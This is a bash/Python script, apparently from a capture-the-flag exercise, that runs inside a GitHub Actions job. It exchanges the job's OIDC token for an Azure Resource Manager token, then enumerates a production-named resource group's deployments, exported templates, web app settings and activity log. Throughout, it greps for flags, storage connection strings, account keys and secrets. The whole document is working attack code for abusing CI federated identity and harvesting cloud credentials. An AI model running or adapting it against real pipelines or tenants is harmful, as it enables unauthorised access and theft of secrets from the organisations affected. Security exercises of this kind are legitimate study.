#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse
def http(url, headers=None):
    req=urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
RG="rg-tbl-platform-prod-sea"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
import urllib.parse as up
d=up.urlencode({"client_id":CID,"scope":"https://management.azure.com/.default",
  "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
  "client_assertion":IDT}).encode()
req=urllib.request.Request(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", data=d,
    headers={"Content-Type":"application/x-www-form-urlencoded"})
ARM=json.loads(urllib.request.urlopen(req, timeout=30).read())["access_token"]
H={"Authorization":"Bearer "+ARM}
M="https://management.azure.com"

def show(label, url):
    st,b=http(url, H)
    print(f"\n### {label}  HTTP {st}  ({len(b)} bytes)")
    m=FLAG.search(b)
    if m: print("   >>> FLAG:", m.group(1).decode())
    return st,b

st,b=show("RG deployments", f"{M}/subscriptions/{SUB}/resourcegroups/{RG}/providers/Microsoft.Resources/deployments?api-version=2021-04-01")
for dep in jg(b).get("value",[])[:15]:
    nm=dep["name"]; p=dep.get("properties",{})
    print(f"  - {nm} state={p.get('provisioningState')} mode={p.get('mode')}")
    print(f"      parameters: {json.dumps(p.get('parameters',{}))[:400]}")
    print(f"      outputs:    {json.dumps(p.get('outputs',{}))[:400]}")
    st2,b2=http(f"{M}/subscriptions/{SUB}/resourcegroups/{RG}/providers/Microsoft.Resources/deployments/{nm}/exportTemplate?api-version=2021-04-01", H)
    if st2==200:
        mm=FLAG.search(b2)
        print(f"      template {len(b2)}b" + (f"  >>> FLAG: {mm.group(1).decode()}" if mm else ""))
        if mm is None:
            tt=b2.decode("utf-8","replace")
            for kw in ("CONFIG_STORAGE_CONNECTION","AccountKey","connectionString","secret"):
                for mo in re.finditer(kw, tt, re.I):
                    print("        ctx:", tt[max(0,mo.start()-80):mo.start()+160].replace("\n"," ")[:240]); break

show("sub deployments", f"{M}/subscriptions/{SUB}/providers/Microsoft.Resources/deployments?api-version=2021-04-01")
st,b=show("webapp config/web", f"{M}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01")
print(json.dumps(jg(b).get("properties",{}), indent=0)[:600])
st,b=show("webapp metadata via GET appsettings", f"{M}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config?api-version=2022-03-01")
print(b[:800])
show("activity log", f"{M}/subscriptions/{SUB}/providers/microsoft.insights/eventtypes/management/values?api-version=2015-04-01&$filter=" + up.quote("eventTimestamp ge '2026-10-20T00:00:00Z'"))
PYEOF
echo "=== done ==="